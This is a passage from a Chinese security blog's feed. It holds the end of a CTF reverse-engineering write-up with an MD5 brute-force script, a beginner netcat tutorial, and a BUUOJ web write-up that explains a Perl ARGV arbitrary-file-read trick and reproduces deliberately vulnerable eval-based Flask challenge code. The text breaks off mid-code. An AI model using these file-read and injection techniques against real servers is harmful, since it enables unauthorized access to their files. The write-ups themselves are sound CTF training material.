&#39;e5438e78ec1de10a2693f9cffb930d23&#39;, &#39;08e8e8855af8ea652df54845d21b9d67&#39;, &#39;a905095f0d801abd5865d649a646b397&#39;, &#39;bac8510b0902185146c838cdf8ead8e0&#39;, &#39;f26f009a6dc171e0ca7a4a770fecd326&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;4cb467175ab6763a9867b9ed694a2780&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;fd311e9877c3db59027597352999e91f&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;7fb523b42413495cc4e610456d1f1c84&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;bc52c927138231e29e0b05419e741902&#39;, &#39;515b7eceeb8f22b53575afec4123e878&#39;, &#39;451660d67c64da6de6fadc66079e1d8a&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;fe86104ce1853cb140b7ec0412d93837&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;c2bab7ea31577b955e2c2cac680fb2f4&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;f077b3a47c09b44d7077877a5aff3699&#39;, &#39;620741f57e7fafe43216d6aa51666f1d&#39;, &#39;9e3b206e50925792c3234036de6a25ab&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;874992ac91866ce1430687aa9f7121fc&#39;]def func(num):    result &#x3D; []    while num !&#x3D; 1:        num &#x3D; num * 3 + 1 if num % 2 else num &#x2F;&#x2F; 2        result.append(num)    return resultif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    print(&#39;Your input is not the FLAG!&#39;)    inp &#x3D; input()    if len(inp) !&#x3D; 27:        print(&#39;length error!&#39;)        sys.exit(-1)    for i, ch in enumerate(inp):        ret_list &#x3D; func(ord(ch))        s &#x3D; &#39;&#39;        for idx in range(len(ret_list)):            s +&#x3D; str(ret_list[idx])            s +&#x3D; str(ret_list[(len(ret_list) - idx - 1)])        md5 &#x3D; hashlib.md5()        md5.update(s.encode(&#39;utf-8&#39;))        if md5.hexdigest() !&#x3D; check[i]:            sys.exit(i)    md5 &#x3D; hashlib.md5()    md5.update(inp.encode(&#39;utf-8&#39;))    print(&#39;You win!&#39;)    print(&#39;flag&#123;&#39; + md5.hexdigest() + &#39;&#125;&#39;)# okay decompiling ReMe.pyc</code></pre><p>exp:</p><pre class="language-none"><code class="language-none">import hashlibcheck &#x3D; [ &#39;e5438e78ec1de10a2693f9cffb930d23&#39;, &#39;08e8e8855af8ea652df54845d21b9d67&#39;, &#39;a905095f0d801abd5865d649a646b397&#39;, &#39;bac8510b0902185146c838cdf8ead8e0&#39;, &#39;f26f009a6dc171e0ca7a4a770fecd326&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;4cb467175ab6763a9867b9ed694a2780&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;fd311e9877c3db59027597352999e91f&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;7fb523b42413495cc4e610456d1f1c84&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;bc52c927138231e29e0b05419e741902&#39;, &#39;515b7eceeb8f22b53575afec4123e878&#39;, &#39;451660d67c64da6de6fadc66079e1d8a&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;fe86104ce1853cb140b7ec0412d93837&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;c2bab7ea31577b955e2c2cac680fb2f4&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;f077b3a47c09b44d7077877a5aff3699&#39;, &#39;620741f57e7fafe43216d6aa51666f1d&#39;, &#39;9e3b206e50925792c3234036de6a25ab&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;874992ac91866ce1430687aa9f7121fc&#39;]def func(number):    ret &#x3D; []    while number !&#x3D; 1:        number &#x3D; number * 3 + 1 if number % 2 else number &#x2F;&#x2F; 2        ret.append(number)    return retfor i in range(1,128):    a &#x3D; func(i)    ans &#x3D; &quot;&quot;    for j in range(len(a)):        ans +&#x3D; str(a[j])        ans +&#x3D; str(a[(len(a) - j - 1)])    md5 &#x3D; hashlib.md5()    md5.update(ans.encode(&#39;utf-8&#39;))    b &#x3D; md5.hexdigest()    for j in range(27):        if b &#x3D;&#x3D; check[j]:            print chr(i),j</code></pre><p>跑出 flag{My_M@th_3X+1_R3v_Te5t} 再跑md5</p><img src="/article/2020hxb-Writeup-cOMING/ac2500682b8e1112e9a89ce1b1f97465.png" class="" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netcat 网络测试工具</title>
      <link href="article/Netcat/"/>
      <url>article/Netcat/</url>
      
        <content type="html"><![CDATA[<h2 id="这里是中国科技大学-taoky-写的一篇文章-nc是什么"><a href="#这里是中国科技大学-taoky-写的一篇文章-nc是什么" class="headerlink" title="这里是中国科技大学@taoky 写的一篇文章: nc是什么?"></a><strong>这里是中国科技大学@taoky 写的一篇文章: nc是什么?</strong></h2><p>请仔细阅读，一般二进制bin方向可能用到nc的地方会很多。</p><hr><p>nc/ncat 是 netcat 的缩写，它可以读写 TCP 与 UDP 端口——或许你看不懂这句话，这没有关系。简单地说，它可以在字符界面下，让你和服务器沟通交流。<br>一般来说，有很多题目都会要求你使用 nc 连接到他们的服务器，并且进行交互，获得 flag</p><h2 id="如何安装-nc？"><a href="#如何安装-nc？" class="headerlink" title="如何安装 nc？"></a>如何安装 nc？</h2><p><code>nc</code> 命令在 macOS 中是自带的，在 Linux 中一般自带，或是可以使用相应的软件包管理器安装（如在 Debian/Ubuntu 中这个包名叫 netcat）。</p><p>当然，如果你在看这篇手册，你的操作系统很有可能是 Windows。它不自带 <code>nc</code>，尽管可以用 WSL 或者虚拟机的方式解决，但是如果你觉得这样太麻烦了，也有另外一些方法。</p><h3 id="使用静态链接的-ncat-程序"><a href="#使用静态链接的-ncat-程序" class="headerlink" title="使用静态链接的 ncat 程序"></a>使用静态链接的 ncat 程序</h3><p>前往 <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">此处</a> (github链接)下载此程序。我们也在这里提供了一份。下载下来即可。</p><p><a href="/download/ncat.zip">ncat.zip</a></p><blockquote><p>注：nc/ncat 事实上是两个不同的程序，但在我们接下来的使用上，基本没有区别。ncat 是由 Nmap 项目开发的“重置版的 Netcat”。</p></blockquote><h4 id="Q-我的杀毒软件报毒怎么办"><a href="#Q-我的杀毒软件报毒怎么办" class="headerlink" title="Q:我的杀毒软件报毒怎么办"></a>Q:我的杀毒软件报毒怎么办</h4><p>如果你不相信此来源，也可以下载 nmap（一个网络探测、扫描工具），它会附带一个 ncat。</p><h2 id="如何使用-nc"><a href="#如何使用-nc" class="headerlink" title="如何使用 nc?"></a>如何使用 nc?</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>直接双击，你会看到一个窗口一扫而过——这是正常现象。你需要使用「命令提示符」或者「PowerShell」来访问这个程序。</p><p>Windows 10 中，你可以使用资源管理器 -&gt; 文件来在你存放 nc 的目录中打开命令提示符或 PowerShell。</p><img src="/article/Netcat/explorer-1024x510.png" class="" loading="lazy"><h6 id="在-Windows-资源管理器中打开命令提示符或-PowerShell"><a href="#在-Windows-资源管理器中打开命令提示符或-PowerShell" class="headerlink" title="在 Windows 资源管理器中打开命令提示符或 PowerShell"></a>在 Windows 资源管理器中打开命令提示符或 PowerShell</h6><p>可以直接在<code>ncat.exe</code>所在目录，按住<code>Shift+鼠标右键</code>点击<code>在此处打开Powershell窗口</code>输入<code>ncat</code></p><p>或者，你也可以在开始菜单 -&gt; Windows 系统中打开命令提示符，或者在开始菜单 -&gt; Windows PowerShell 中打开 PowerShell，也可以按住<code>win标+R</code>弹出<code>运行</code>窗口输入<code>cmd</code>，然后使用 cd 命令转移到对应的目录：输入 cd 文件夹名 可以让你转移到对应的文件夹，输入 cd .. 可以让你转移到上面一层目录。使用 dir 命令，可以显示当前目录下所有文件。同时，使用 Tab 键可以帮助你补全名称。</p><p>当跳转到你存放 nc 的文件夹后：</p><ul><li>如果你使用的是 PowerShell（蓝色背景），输入 ./ncat（根据 nc 对应的名称不同而不同）。</li><li>如果你使用的是命令提示符（黑色背景），输入 ncat（根据 nc 对应的名称不同而不同）。</li></ul><p>当显示以下内容时，说明你成功运行了它。</p><img src="/article/Netcat/image-20210220172523253.png" class="" title="nc" loading="lazy"><h6 id="成功运行-ncat"><a href="#成功运行-ncat" class="headerlink" title="成功运行 ncat"></a>成功运行 ncat</h6><h3 id="Linux-amp-macOS"><a href="#Linux-amp-macOS" class="headerlink" title="Linux &amp; macOS"></a>Linux &amp; macOS</h3><p>打开「终端」，输入 <code>nc</code>。</p><pre class="language-none"><code class="language-none">$ ncusage: nc [-46AacCDdEFhklMnOortUuvz] [-K tc] [-b boundif] [-i interval] [-p source_port] [--apple-delegate-pid pid] [--apple-delegate-uuid uuid]  [-s source_ip_address] [-w timeout] [-X proxy_version]  [-x proxy_address[:port]] [hostname] [port[s]]</code></pre><p>出现了类似上面的输出，说明运行成功了。</p><img src="/article/Netcat/image-20210220170815879.png" class="" title="image-20210220170815879" loading="lazy"><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>在我们使用浏览器上网的时候，我们和服务器使用了 HTTP 协议进行连接。关于 HTTP 协议的更多细节，你需要自己上网搜索。一般来说，默认是 80 端口。</p><p>我们可以使用 nc，尝试一次与网页服务器的连接，以百度为例。</p><p>输入 <code>nc www.baidu.com 80</code>（或者 <code>ncat www.baidu.com 80</code>，或者 <code>./ncat www.baidu.com 80</code>，请根据以上的介绍自行修改），程序会等待你的输入。</p><p>输入 GET / HTTP/1.0。这表示，我们使用 HTTP/1.0 这个协议版本，用 GET 的方式请求根 /。输入<strong>两下</strong>回车，代表我们的 HTTP 请求完成。如果你的网络畅通，百度的网页服务器会立刻返回大量信息，可以自行搜索，了解它们的含义。现在，你成功（在不使用浏览器的情况下）完成了一次与百度网站的连接！</p><img src="/article/Netcat/image-20210220172713535.png" class="" title="nc success" loading="lazy"><h6 id="内容可能不同，返回类似即表示成功"><a href="#内容可能不同，返回类似即表示成功" class="headerlink" title="内容可能不同，返回类似即表示成功"></a>内容可能不同，返回类似即表示成功</h6><p>如果你成功了，那么你可以开始愉快地完成我们的题目了！</p><hr><p>end</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 菜鸡教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Netcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuoj WEB Write-up</title>
      <link href="article/Buuoj-WEB-Write-up/"/>
      <url>article/Buuoj-WEB-Write-up/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><p>刷题，buuoj记录</p><a id="more"></a><hr><h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129165730787.png" class="" title="image-20201129165730787" loading="lazy"><p>咱也不懂perl…</p><p>发现了文件上传的地方</p><img src="/article/Buuoj-WEB-Write-up/image-20201129165825648.png" class="" title="image-20201129165825648" loading="lazy"><p>发现会把上传的文件直接显示在网页上</p><p>查了下原理</p><h5 id="perlparam-任意文件读取"><a href="#perlparam-任意文件读取" class="headerlink" title="perlparam()任意文件读取"></a>perlparam()任意文件读取</h5><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cgi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    my <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$cgi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$file</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">print</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span>        <span class="token keyword">print</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p> 如上代码将上传的文件原样输出到网页 </p><p>知识点： param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。 </p><p>ARGV——命令行参数</p><p>于是抓包</p><img src="/article/Buuoj-WEB-Write-up/image-20201129170225902.png" class="" title="image-20201129170225902" loading="lazy"><p>修改为：</p><img src="/article/Buuoj-WEB-Write-up/image-20201129170548925.png" class="" title="image-20201129170548925" loading="lazy"><hr><h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129170732360.png" class="" title="image-20201129170732360" loading="lazy"><p>source code</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span>url_prefix <span class="token operator">=</span> <span class="token string">'/d5afe1f66147e857'</span><span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span><span class="token keyword">def</span> <span class="token function">trigger_event</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">+=</span> event    <span class="token keyword">else</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> haystack<span class="token keyword">class</span> <span class="token class-name">RollBackException</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">execute_event_loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    valid_event_chars <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>        <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>event_queue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span>        event <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> event<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">,</span> <span class="token string">'func:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> event<span class="token punctuation">:</span>            <span class="token keyword">if</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> valid_event_chars<span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            is_action <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span>            action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>            args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action<span class="token operator">+</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                event_handler <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>                    action <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'_handler'</span> <span class="token keyword">if</span> is_action <span class="token keyword">else</span> <span class="token string">'_function'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                ret_val <span class="token operator">=</span> event_handler<span class="token punctuation">(</span>args<span class="token punctuation">)</span>            <span class="token keyword">except</span> RollBackException<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                resp <span class="token operator">+=</span> <span class="token string">'ERROR! All transactions have been cancelled. &lt;br />'</span>                resp <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>                session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>                session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                <span class="token comment"># resp += str(e) # only for debugging</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> ret_val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> ret_val                <span class="token keyword">else</span><span class="token punctuation">:</span>                    resp <span class="token operator">+=</span> ret_val    <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> resp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'404 NOT FOUND'</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">entry_point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    querystring <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_string<span class="token punctuation">)</span>    request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> querystring <span class="token operator">==</span> <span class="token string">''</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token keyword">not</span> querystring<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>querystring<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>        querystring <span class="token operator">=</span> <span class="token string">'action:index;False#False'</span>    <span class="token keyword">if</span> <span class="token string">'num_items'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    request<span class="token punctuation">.</span>prev_session <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span>    <span class="token keyword">return</span> execute_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># handlers/functions below --------------------------------------</span><span class="token keyword">def</span> <span class="token function">view_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    page <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    html <span class="token operator">=</span> <span class="token string">''</span>    html <span class="token operator">+=</span> <span class="token string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> page <span class="token operator">==</span> <span class="token string">'index'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23False">View source code&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;shop">Go to e-shop&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;reset">Reset&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'shop'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:buy;1">Buy a diamond (1 point)&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>        <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>        html <span class="token operator">+=</span> <span class="token string">'Session reset.&lt;br />'</span>    html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    bool_show_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    bool_download_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> bool_show_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>        source <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'eventLoop.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        html <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23True">Download this .py file&lt;/a>&lt;br />'</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>            <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>                    <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line        source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=serve.py'</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> html    <span class="token keyword">else</span><span class="token punctuation">:</span>        trigger_event<span 